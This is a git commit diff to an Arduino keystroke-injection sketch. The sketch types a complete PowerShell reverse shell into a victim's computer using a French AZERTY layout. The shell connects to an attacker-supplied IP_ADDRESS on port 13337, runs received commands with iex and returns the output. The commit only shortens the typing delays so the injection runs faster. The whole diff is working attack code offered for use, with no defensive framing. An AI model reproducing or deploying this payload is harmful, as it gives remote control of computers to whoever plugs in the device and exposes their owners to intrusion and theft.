6a683a1e20a6d3d1e8a30f5dd321d4652c8d8347
Teckinfor <35048771+Teckinfor@users.noreply.github.com>
2020-02-24 22:34:20 +0100

    Update sketch_feb22a.ino

--- ArduinoCode/sketch_feb22a.ino
+++ ArduinoCode/sketch_feb22a.ino
@@ -19,134 +19,134 @@ void setup() {
 
 //Creating the Reverse Shell
   KeyboardAzertyFr.print("$client = New-Object System.Net.Sockets.TCPClient(\"IP_ADDRESS\",13337);$stream = $client.GetStream();");         //IN THIS LINE, YOU NEED TO CHANGE IP_ADDRESS !!!!!!!!!
-  delay(300);
+  delay(50);
   
   KeyboardAzertyFr.press(KEY_LEFT_CTRL);
   KeyboardAzertyFr.press(KEY_LEFT_ALT);
   KeyboardAzertyFr.print("("); // --> "["
   KeyboardAzertyFr.releaseAll();
-  delay(100);
+  delay(50);
 
   KeyboardAzertyFr.print("byte");
-  delay(300);
+  delay(50);
 
   
   KeyboardAzertyFr.press(KEY_LEFT_CTRL);
   KeyboardAzertyFr.press(KEY_LEFT_ALT);
   KeyboardAzertyFr.print("())"); // --> "[]["
   KeyboardAzertyFr.releaseAll();
-  delay(100);
+  delay(50);
 
   KeyboardAzertyFr.print("$bytes = 0..65535");
-  delay(300);
+  delay(50);
 
   KeyboardAzertyFr.press(KEY_LEFT_CTRL);
   KeyboardAzertyFr.press(KEY_LEFT_ALT);
   KeyboardAzertyFr.print("-"); // --> "|"
   KeyboardAzertyFr.releaseAll();
-  delay(100);
+  delay(50);
 
   
   KeyboardAzertyFr.print("%");
-  delay(300);
+  delay(50);
 
 
   KeyboardAzertyFr.press(KEY_LEFT_CTRL);
   KeyboardAzertyFr.press(KEY_LEFT_ALT);
   KeyboardAzertyFr.print("'"); // --> "{"
   KeyboardAzertyFr.releaseAll();
-  delay(100);
+  delay(50);
 
   KeyboardAzertyFr.print("0");
-  delay(300);
+  delay(50);
   
   KeyboardAzertyFr.press(KEY_LEFT_CTRL);
   KeyboardAzertyFr.press(KEY_LEFT_ALT);
   KeyboardAzertyFr.print("="); // --> "}"
   KeyboardAzertyFr.releaseAll();
-  delay(100);
+  delay(50);
 
   KeyboardAzertyFr.print(";while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)");
-  delay(300);
+  delay(50);
 
 
   KeyboardAzertyFr.press(KEY_LEFT_CTRL);
   KeyboardAzertyFr.press(KEY_LEFT_ALT);
   KeyboardAzertyFr.print("'"); // --> "{"
   KeyboardAzertyFr.releaseAll();
-  delay(100);
+  delay(50);
 
   KeyboardAzertyFr.print(";$data = ");
-  delay(300);
+  delay(50);
   
   KeyboardAzertyFr.print("(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 ");
-  delay(300);
+  delay(50);
 
   KeyboardAzertyFr.press(KEY_LEFT_CTRL);
   KeyboardAzertyFr.press(KEY_LEFT_ALT);
   KeyboardAzertyFr.print("-"); // --> "|"
   KeyboardAzertyFr.releaseAll();
-  delay(100);
+  delay(50);
 
   KeyboardAzertyFr.print(" Out-String );");
-  delay(300);
+  delay(50);
 
   KeyboardAzertyFr.print("$sendback2 = $sendback ");
-  delay(300);
+  delay(50);
 
   KeyboardAzertyFr.press(KEY_LEFT_SHIFT);
   KeyboardAzertyFr.print("="); // --> "+"
   KeyboardAzertyFr.releaseAll();
-  delay(100);
+  delay(50);
 
   KeyboardAzertyFr.print(" \"PS \" ");
-  delay(300);
+  delay(50);
 
   KeyboardAzertyFr.press(KEY_LEFT_SHIFT);
   KeyboardAzertyFr.print("="); // --> "+"
   KeyboardAzertyFr.releaseAll();
-  delay(100);
-
+  delay(50);
+  
   KeyboardAzertyFr.print(" (pwd).Path ");
-  delay(300);
+  delay(50);
 
   KeyboardAzertyFr.press(KEY_LEFT_SHIFT);
   KeyboardAzertyFr.print("="); // --> "+"
   KeyboardAzertyFr.releaseAll();
-  delay(100);
+  delay(50);
 
   KeyboardAzertyFr.print(" \"> \";$sendbyte = (");
-  delay(300);
+  delay(50);
   
   KeyboardAzertyFr.press(KEY_LEFT_CTRL);
   KeyboardAzertyFr.press(KEY_LEFT_ALT);
   KeyboardAzertyFr.print("("); // --> "["
   KeyboardAzertyFr.releaseAll();
-  delay(100);
+  delay(50);
 
   KeyboardAzertyFr.print("text.encoding");
-  delay(300);
+  delay(50);
 
   KeyboardAzertyFr.press(KEY_LEFT_CTRL);
   KeyboardAzertyFr.press(KEY_LEFT_ALT);
   KeyboardAzertyFr.print(")"); // --> "]"
   KeyboardAzertyFr.releaseAll();
-  delay(100);
+  delay(50);
 
   KeyboardAzertyFr.print("::ASCII).GetBytes($sendback2);");
-  delay(300);
+  delay(50);
   
   KeyboardAzertyFr.print("$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()");
-  delay(2000);
+  delay(50);
 
   KeyboardAzertyFr.press(KEY_LEFT_CTRL);
   KeyboardAzertyFr.press(KEY_LEFT_ALT);
   KeyboardAzertyFr.print("="); // --> "}"
   KeyboardAzertyFr.releaseAll();
-  delay(100);
+  delay(50);
 
   KeyboardAzertyFr.print(";$client.Close()");
-  delay(2000);
+  delay(50);
 
   
   KeyboardAzertyFr.press(KEY_RETURN);
